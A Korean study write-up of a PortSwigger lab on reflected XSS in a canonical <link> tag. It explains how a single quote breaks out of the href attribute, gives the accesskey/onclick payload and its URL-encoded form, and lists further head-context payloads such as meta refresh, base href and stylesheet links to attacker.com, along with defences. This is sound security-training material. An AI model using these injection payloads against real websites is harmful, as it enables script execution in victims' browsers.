# Lab: Reflected XSS in canonical link tag

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — Reflected / `<link>` 태그 / `accesskey` + `onclick` 조합
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

## 목표

`<head>` 안의 `<link rel="canonical">` 태그에 검색어가 반영되는 취약점을 이용해 `accesskey` 와 `onclick` 조합으로 `alert()` 를 실행시킨다.

## 취약점 분석

검색어가 `<head>` 내부의 canonical link 태그 `href` 속성에 반영된다.

```html
<!-- 정상 검색 시 -->
<head>
  <link rel="canonical" href='https://example.com/?search=hello'/>
</head>
```

`<link>` 태그는:
- `<head>` 안에 위치 — 페이지에 **시각적으로 표시되지 않음**
- 마우스로 클릭 불가능
- `onload`, `onerror`, `onmouseover` 등 일반 이벤트 핸들러를 유발할 수 없음

따라서 **클릭 없이 활성화할 수 있는 방법**이 필요하다.

## 공격 방법

### 페이로드

```
'accesskey='x'onclick='alert(1)
```

URL 인코딩 형태:
```
/?search=%27accesskey%3D%27x%27onclick%3D%27alert(1)
```

### 생성되는 HTML

```html
<link rel="canonical" href='https://example.com/?search='accesskey='x'onclick='alert(1)'/>
```

브라우저 파싱 결과:

```
href       = 'https://example.com/?search='   ← ' 로 닫힘
accesskey  = 'x'                               ← 키보드 단축키 설정
onclick    = 'alert(1)'                        ← 활성화 시 실행
```

`'` 로 `href` 속성을 닫고, `accesskey` 와 `onclick` 을 새 속성으로 삽입한다.

### 실행 방법 — accesskey 단축키

`accesskey="x"` 는 브라우저/OS 조합에 따라 다른 키로 활성화된다.

| 브라우저 / OS | 단축키 |
|--------------|--------|
| Chrome (Windows/Linux) | `Alt` + `X` |
| Chrome (Mac) | `Control` + `Alt` + `X` |
| Firefox (Windows/Linux) | `Alt` + `Shift` + `X` |
| Firefox (Mac) | `Control` + `Alt` + `X` |
| Safari (Mac) | `Control` + `Alt` + `X` |
| Edge (Windows) | `Alt` + `X` |

단축키를 누르면 `<link>` 요소가 "활성화"되고 `onclick` 이벤트가 발화한다.

## `accesskey` 속성 이해

`accesskey` 는 HTML 전역 속성으로, **모든 HTML 요소**에 설정 가능하다.  
지정된 키 조합을 누르면 해당 요소를 "활성화"한다.

### 요소 유형별 활성화 동작

| 요소 유형 | 활성화 동작 |
|-----------|------------|
| `<a href>`, `<link href>` | `onclick` 발화 + href 이동 |
| `<button>`, `<input[type=submit]>` | 클릭 이벤트 + 폼 제출 |
| `<input[type=text]>`, `<textarea>` | 포커스 이동 |
| `<input[type=checkbox/radio]>` | 체크 토글 |
| `<select>` | 포커스 이동 |
| `<div>`, `<span>` (tabindex 포함) | `onclick` 발화 |
| **`<link>` (head 내)** | **`onclick` 발화** (이번 랩 핵심) |

### XSS에서의 활용

보이지 않거나 클릭할 수 없는 요소에 `onclick` 을 삽입할 때 `accesskey` 로 활성화할 수 있다.

```html
<!-- head 내 link — 보이지 않지만 accesskey로 활성화 가능 -->
<link rel="canonical" href="/" accesskey="x" onclick="alert(1)">

<!-- meta 태그에 삽입된 경우 -->
<meta name="description" content="test" accesskey="x" onclick="alert(1)">

<!-- 화면 밖에 숨겨진 요소 -->
<div style="display:none" accesskey="x" onclick="alert(1)">
```

## 이번 랩의 컨텍스트 — `<head>` 내부 속성 인젝션

이번 랩은 지금까지와 다른 새로운 컨텍스트다.

| 컨텍스트 | 탈출 방법 | 이벤트 실행 방법 |
|----------|-----------|----------------|
| HTML 태그 사이 | `<script>`, `<svg>` 직접 삽입 | 로드 즉시 |
| HTML 속성 값 (`"`) | `"` 로 탈출 + 이벤트 속성 추가 | autofocus 또는 사용자 상호작용 |
| HTML 속성 값 (`'`) | `'` 로 탈출 + 이벤트 속성 추가 | accesskey 또는 사용자 상호작용 |
| `<head>` 내 `<link>` href (`'`) | `'` 로 탈출 | **accesskey** (직접 클릭 불가) |
| JS 문자열 | `'` 또는 `"` 로 탈출 + `;` | 코드로 직접 실행 |

`<head>` 안의 요소는 사용자가 직접 상호작용할 수 없으므로 `accesskey` 가 유일한 실행 수단이 된다.

## 핵심 정리

- `<link>` 태그는 화면에 보이지 않고 클릭할 수 없어, 일반 이벤트 핸들러 활용이 불가능하다.
- `accesskey` 속성은 모든 HTML 요소에 키보드 단축키를 부여하여 `onclick` 을 발화시킬 수 있다.
- `href` 속성이 `'` 로 감싸진 경우 `'` 로 탈출하여 새 속성을 삽입한다.
- **방어**:
  - URL 파라미터를 `<link>` 태그 속성에 반영할 때 `'` 와 `"` 모두 인코딩
  - canonical URL은 화이트리스트 도메인만 허용
  - CSP `script-src` 로 인라인 이벤트 핸들러 차단

## 배운 점 및 추가 학습

### 1. `accesskey` XSS 페이로드 패턴

```html
<!-- <link> 태그 (head 내부) -->
<link href="/" accesskey="x" onclick="alert(1)">

<!-- 숨겨진 input -->
<input type="hidden" accesskey="x" onclick="alert(1)">

<!-- display:none 요소 -->
<div style="display:none" accesskey="x" onclick="alert(1)" tabindex="-1">

<!-- meta 태그 (일부 브라우저에서 동작) -->
<meta accesskey="x" onclick="alert(1)">

<!-- head 내 style — accesskey 지원 여부 브라우저마다 다름 -->
<style accesskey="x" onclick="alert(1)">
```

### 2. `<link>` 태그의 보안 관련 속성

`<link>` 태그는 다양한 목적으로 사용되며, 잘못 처리되면 여러 공격 벡터가 된다.

```html
<!-- canonical — 이번 랩 -->
<link rel="canonical" href="...">

<!-- stylesheet 로드 — CSS injection 가능 -->
<link rel="stylesheet" href="https://attacker.com/evil.css">

<!-- preload — 리소스 미리 로드 -->
<link rel="preload" href="..." as="script">

<!-- prefetch — 다음 페이지 미리 로드 -->
<link rel="prefetch" href="...">
```

`href` 에 외부 URL이 삽입 가능하면 외부 리소스 로드(CSS injection 등)도 가능하다.

### 3. `<head>` 컨텍스트의 다른 인젝션 포인트

```html
<!-- meta charset/refresh -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

<!-- base href — 모든 상대 URL 경로 변경 -->
<base href="https://attacker.com/">
<!-- 이후 <script src="/app.js"> → attacker.com/app.js 로드 -->

<!-- style 태그 내 CSS injection -->
<style>
  body { background: url('javascript:alert(1)') }  /* 일부 구형 브라우저 */
</style>
```

### 4. 보이지 않는 요소의 이벤트 활성화 방법 비교

| 방법 | 조건 | 자동 실행 |
|------|------|-----------|
| `accesskey` + `onclick` | 사용자가 단축키를 누를 때 | X (단축키 필요) |
| `autofocus` + `onfocus` | 포커스 가능 요소 | O (페이지 로드 시) |
| URL 해시 `#id` + `onfocus` | tabindex + id 설정 | O (URL 방문 시) |
| `onbegin` (SVG) | SVG 애니메이션 요소 | O (페이지 로드 시) |
| iframe `onload` 크기 변경 | 별도 iframe 필요 | O (iframe 로드 시) |

`accesskey` 는 자동 실행이 아니므로 실제 공격에서는 사회공학(특정 키를 누르도록 유도)이 필요하다.  
PortSwigger 랩에서는 실제 키 입력으로 동작을 검증하는 방식으로 출제된다.
